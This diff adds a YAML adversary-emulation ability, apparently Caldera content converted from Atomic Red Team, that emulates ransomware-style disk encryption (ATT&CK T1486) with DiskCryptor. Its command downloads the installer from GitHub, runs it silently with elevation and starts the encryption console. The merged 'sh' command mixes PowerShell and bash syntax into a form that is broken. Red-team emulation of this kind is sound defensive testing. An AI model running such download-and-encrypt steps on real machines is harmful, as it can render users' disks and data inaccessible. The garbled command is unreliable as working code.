@@ -1,0 +1,64 @@
+- id: 44b68e11-9da2-4d45-a0d9-893dabd60f30
+  name: Data Encrypt Using DiskCryptor
+  description: DiskCryptor, an open source encryption utility, can be exploited by
+    adversaries for encrypting all disk partitions, including system partitions. This
+    tool was identified in a ransomware campaign, as reported on https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/.
+    The documentation for DiskCryptor can be found at https://github.com/DavidXanatos/DiskCryptor.
+    During the installation process, running dcrypt.exe starts the encryption console.
+    It's important to note that a system reboot is necessary as part of the installation.
+  tactic: impact
+  technique:
+    attack_id: T1486
+    name: Data Encrypted for Impact
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "${env:ProgramFiles}/dcrypt/dcrypt.exe") {exit 0}
+          else {exit 1}; then : ; else Write-Host Downloading DiskCryptor installer;
+          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
+          Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe"
+          -OutFile      "PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe";
+          Write-Host Install DiskCryptor; Start-Process "PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"
+          -Wait -ArgumentList "/s"; fi; ""%PROGRAMFILES%\dcrypt"\dcrypt.exe"'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - impact
+  - t1486
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      dcrypt_exe:
+        description: The dcrypt.exe executable from dcrypt_setup.exe
+        type: path
+        default: dcrypt.exe
+    dependencies:
+    - description: 'dcrypt_setup will be installed at specified location (#{dcrypt_exe})
+
+        '
+      prereq_command: 'if (Test-Path "${env:ProgramFiles}/dcrypt/#{dcrypt_exe}") {exit
+        0} else {exit 1}
+
+        '
+      get_prereq_command: 'Write-Host Downloading DiskCryptor installer
+
+        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
+        Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe"
+        -OutFile      "PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"
+
+        Write-Host Install DiskCryptor
+
+        Start-Process "PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"
+        -Wait -ArgumentList "/s"
+
+        '
+    technique_created: '2019-03-15T13:59:30.390Z'
+    atomic_guid: 44b68e11-9da2-4d45-a0d9-893dabd60f30
+    import_timestamp: '2025-06-24T11:15:07.754567Z'
